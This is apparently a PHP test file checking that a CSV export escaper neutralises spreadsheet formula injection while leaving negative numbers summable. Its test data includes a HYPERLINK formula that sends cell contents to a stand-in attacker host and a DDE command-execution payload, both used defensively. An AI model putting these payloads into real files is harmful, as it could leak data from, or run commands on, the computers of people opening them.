<?php

declare(strict_types=1);

use App\Domain\Export\CsvCell;

/*
|--------------------------------------------------------------------------
| CSV formula injection
|--------------------------------------------------------------------------
|
| SECURITY.md §15.13. The threat is not to this application: the value is inert
| here and only becomes executable code when an accountant opens the file in
| Excel. That is why the defence lives at the export boundary and why it has to
| be tested there — nothing upstream will ever fail because of it.
|
*/

it('escapes a cell that a spreadsheet would treat as a formula', function (string $value): void {
    expect(CsvCell::escape($value))->toBe("'".$value);
})->with([
    '=1+1',
    '=HYPERLINK("http://attacker.test/?d="&A1,"Invoice")',
    '+1+1',
    '@SUM(A1:A9)',
    '-A1',
    '-1+1',
    '=cmd|\' /c calc\'!A0',
    "\tleading tab",
    "\rleading carriage return",
]);

/*
 * The deliberate narrowing of §9.6, and the reason it is safe.
 *
 * Escaping every cell beginning `-` would turn every refund, loss and downward
 * adjustment in a financial export into TEXT, so the column would not sum —
 * and an export whose purpose is to be summed not summing is the feature being
 * broken, which ends with somebody removing the escaping entirely.
 *
 * The security property is untouched: a string that parses as a number cannot
 * also be a formula. The cases above prove the formulas are still caught.
 */
it('leaves a well-formed negative number alone, so the column still sums', function (string $value): void {
    expect(CsvCell::escape($value))->toBe($value);
})->with([
    '-1450.00',
    '-0.5',
    '-12',
    '+42.75',
    '-.25',
]);

it('passes ordinary values through unchanged', function (): void {
    expect(CsvCell::escape('Layla Hassan'))->toBe('Layla Hassan')
        ->and(CsvCell::escape('ORD-2026-0041'))->toBe('ORD-2026-0041')
        ->and(CsvCell::escape('1450.00'))->toBe('1450.00')
        ->and(CsvCell::escape(''))->toBe('');
});

it('renders null as an empty cell rather than the word null', function (): void {
    expect(CsvCell::escape(null))->toBe('');
});

it('renders booleans as words, not as 1 and an empty string', function (): void {
    // PHP casts false to '', which in a CSV is indistinguishable from null.
    // "Active: " and "Active: false" are different statements.
    expect(CsvCell::escape(true))->toBe('true')
        ->and(CsvCell::escape(false))->toBe('false');
});
